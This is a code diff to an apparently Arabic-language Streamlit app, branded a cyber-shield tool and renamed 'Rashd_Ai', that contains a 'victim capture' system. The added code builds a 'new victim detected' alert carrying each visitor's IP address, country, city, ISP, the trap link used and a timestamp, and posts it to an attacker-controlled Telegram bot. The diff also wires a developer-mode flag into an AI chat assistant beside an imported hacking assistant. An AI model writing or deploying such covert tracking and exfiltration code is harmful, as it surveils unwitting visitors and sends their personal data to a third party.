@@ -35,6 +35,30 @@ import victim_logger
 from ai_hacking import AIHackingAssistant
 from ai_chat import AIChatAssistant
 
+# ============= دالة إرسال التقارير لتلجرام =============
+def send_telegram_report(report_message):
+    """إرسال تقرير إلى تلجرام"""
+    try:
+        bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
+        chat_id = config.get_key("TELEGRAM_CHAT_ID")
+        
+        if not bot_token or not chat_id:
+            return False
+        
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        data = {
+            "chat_id": chat_id,
+            "text": report_message,
+            "parse_mode": "HTML"
+        }
+        
+        response = requests.post(url, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"خطأ في إرسال التقرير: {str(e)}")
+        return False
+
+
 # تحميل .env
 load_dotenv()
 
@@ -42,9 +66,9 @@ load_dotenv()
 logo_path = config.LOGO_PATH
 if os.path.exists(logo_path):
     logo_img = Image.open(logo_path)
-    st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon=logo_img)
+    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon=logo_img)
 else:
-    st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon="🛡️")
+    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")
 
 # ============= نظام التقاط بيانات الضحايا (Victim Capture) =============
 def capture_victim_data():
@@ -93,6 +117,22 @@ def capture_victim_data():
             
             # وضع علامة على أن البيانات تم التقاطها
             st.session_state['victim_captured'] = True
+            
+            # إرسال تقرير لتلجرام
+            try:
+                victim_info = f"""
+🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>
+
+📍 <b>عنوان IP:</b> {user_ip}
+🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}
+🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}
+🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}
+🎯 <b>المصيدة:</b> {query_params.get('target', 'Unknown')}
+⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+                send_telegram_report(victim_info)
+            except:
+                pass
             
         except Exception as e:
             pass
@@ -253,7 +293,7 @@ with st.sidebar:
         victims = victim_logger.get_victims_data()
         st.metric("🎯 الضحايا المكتشفين", len(victims))
 
-st.title("🛡️ سايبر شيلد برو")
+st.title("🛡️ Rashd_Ai")
 st.markdown("<p style='text-align: center;'><code>>> تم تهيئة النظام بنجاح... تم منح الوصول...</code></p>", unsafe_allow_html=True)
 
 # --- التبويبات العامة (متاحة للجميع) ---
@@ -279,7 +319,8 @@ with public_tabs[0]:
 
         with st.chat_message("assistant"):
             with st.spinner("جاري التفكير..."):
-                assistant = AIChatAssistant()
+                is_dev = st.session_state.get('developer_mode', False)
+                assistant = AIChatAssistant(is_developer=is_dev)
                 response = assistant.chat(prompt, st.session_state.chat_history[:-1])
                 st.markdown(response)
                 st.session_state.chat_history.append({"role": "assistant", "content": response})
